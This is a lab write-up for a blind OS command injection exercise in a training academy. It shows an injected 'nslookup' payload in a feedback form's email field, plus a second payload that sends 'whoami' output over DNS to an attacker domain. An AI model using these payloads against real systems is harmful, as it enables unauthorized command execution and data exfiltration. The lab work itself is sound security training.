# 💉 OS-Command-Injection - Lab 04
Blind OS command injection with out-of-band interaction

## 🎯 Objective
To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

## 🔍 Vulnerability
This lab contains a blind OS command injection vulnerability in the feedback function.

## 📝 Methodology

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator’s default public server.

Solution

1. Use Burp Suite to intercept and modify the request that submits feedback.

2. Modify the email parameter, changing it to:

email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||

3. Right-click and select “Insert Collaborator payload” to insert a Burp Collaborator subdomain where indicated in the modified email parameter.

Note

The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use Burp Collaborator to verify that your payload had indeed triggered a DNS lookup. See the lab on blind OS command injection with out-of-band data exfiltration for an example of this.
the out of-band channel provides an exfiltrate the output from injected commands : &

nslookup `whoami`.kgji2ohoyw.web-attacker.com  &

This causes a DNS lookup to the attacker’s domain containing the result of the whoami command:

wwwuser.kgji2ohoyw.web-attacker.com
